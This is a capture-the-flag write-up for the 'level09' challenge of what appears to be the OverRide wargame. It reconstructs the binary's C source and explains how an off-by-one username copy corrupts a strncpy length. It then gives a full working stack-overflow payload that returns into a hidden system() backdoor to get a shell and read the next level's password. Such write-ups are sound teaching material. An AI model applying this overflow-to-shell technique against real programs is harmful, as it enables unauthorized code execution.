# level09

## Reconstructed source code

```c
#include <stdio.h>
#include <string.h>
#include <stdint.h>

static int secret_backdoor()
{
    char s[128];

    fgets(s, 128, stdin);
    return system(s);
}

static int handle_msg()
{
    char buffer[140];
    int64_t var1;
    int64_t var2;
    int64_t var3;
    int64_t var4;
    int64_t var5;
    uint32_t cpy_size;

    var1 = 0;
    var2 = 0;
    var3 = 0;
    var4 = 0;
    var5 = 0;
    cpy_size = 140;
    set_username(buffer);
    set_msg(buffer);
    return puts(">: Msg sent!");
}

static char *set_msg(char *dest)
{
    char buffer[1024];

    memset(buffer, 0, sizeof(buffer));
    puts(">: Msg @Unix-Dude");
    printf(">>: ");
    fgets(buffer, 1024, stdin);
    return strncpy(dest, buffer, *(int *)(&dest[180]));
}

static int set_username(char *dest)
{
    char buffer[128];

    memset(buffer, 0, 128);
    puts(">: Enter your username");
    printf(">>: ");
    fgets(buffer, 128, stdin);
    for (size_t i = 0; i <= 40 && buffer[i]; ++i)
    {
        dest[140 + i] = buffer[i];
    }
    return printf(">: Welcome, %s", &dest[140]);
}

int main()
{
    puts(
        "--------------------------------------------\n"
        "|   ~Welcome to l33t-m$n ~    v1337        |\n"
        "--------------------------------------------");
    handle_msg();
    return 0;
}
```

## A slice of PIE is not enough

This level distinguish itself because the binary is a **P**osition **I**ndependant **E**xecutable. Thus, the `PT_LOAD` segment `p_vaddr` is at zero and can be loaded in virtual memory at a random address that respect the alignment requirement. A **PIE** executable can be loaded exactly like a shared library. On the host system, the **A**ddress **S**pace **L**ayout **R**andomization is disabled : a default base address will be assigned while loading the executable into memory, and will not change between different runs.
The binary does not have a **stack canary** so it is easy to take control of `rip` if we found a stack buffer overflow. Since **NX** is enabled, arbitrary code execution can be possible using **ROP gadgets** but would be overkill since a `secret_backdoor` function is already present in the program's text that leads to a libc `system` call.

## An intentional memory corruption

Once decompiled, we can remark an obvious array overflow in the `set_username` function, that write past the end of the dedicated buffer passed as parameter. It will overwrite the other variable stored on the stack. One of the variable are used as an argument to `strncpy` in the `set_msg` function, and we can control the least significant byte of this variable, by inputing **41** characters as the username and by choosing `0xFF` as character value, we can force `strncpy` to copy at most **256** bytes, overflowing the buffer allocated in the `handle_msg` function.

``` 
level09@OverRide:~$ (python -c 'print("\xFF"*41)'; sleep 0.1; python -c 'print("A"*255)') | ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, �����������������������������������������>: Msg @Unix-Dude
>>: >: Msg sent!
Segmentation fault (core dumped)
```

Using **GDB**, we can fine tune and compute the how many gargabe characters we need to enter :

```
(gdb) r < <(python -c 'print("\xFF"*41)'; sleep 0.1; python -c 'print("A"*200)')
Starting program: /home/users/level09/level09 < <(python -c 'print("\xFF"*41)'; sleep 0.1; python -c 'print("A"*200)')
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, �����������������������������������������>: Msg @Unix-Dude
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0x000000000000000a in ?? ()
```

The `\n` can be seen, and `strncpy` overwrote everything past with **NUL** byte because the number of characters (**256**) to copy is larger that the source string (**200**).

We can find out the address of `secret_backdoor` at runtime also using **GDB**, and since **ASLR** is disabled, we can directly take the address and overwrite the *saved-eip* with the runtime absolute address of the function.

```
(gdb) p secret_backdoor
$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```

The final payload is as follow :

```bash
level09@OverRide:~$ (python -c 'print("\xFF"*41)'; sleep 0.1; python -c 'print("A"*200 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1])'; sleep 0.1; echo "/bin/sh"; cat) | ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, �����������������������������������������>: Msg @Unix-Dude
>>: >: Msg sent!
whoami
end
cd ..
cat end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

Success !